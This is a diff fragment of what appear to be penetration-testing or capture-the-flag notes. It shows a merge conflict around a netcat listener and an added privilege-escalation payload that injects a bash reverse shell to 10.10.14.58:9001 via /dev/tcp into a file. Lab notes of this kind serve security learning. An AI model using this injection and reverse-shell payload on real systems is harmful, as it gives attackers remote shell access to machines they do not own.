@@ -50,11 +50,22 @@ Service detection performed. Please report any incorrect results at https://nmap
     [+] msf.apk stored at /Users/jak/.msf4/local/msf.apk
     ```
 - Reverse Shell
+<<<<<<< HEAD
 	- OS X
         ```sh
         $ nc -nvl 4444
         ``` 
 
+=======
+    ```sh
+    $ nc -nvl 4444
+    ``` 
+        
+>>>>>>> 1bc3e04b2c11ec86471a16769f77969d86f65579
 ### Priviliege Escalate
+- Payload
+    ```sh 
+    $ echo “ ;/usr/bin/bash -c ‘/usr/bin/bash -i >& /dev/tcp/10.10.14.58/9001 0>&1’ #” >> hackers
+    ```
 
 
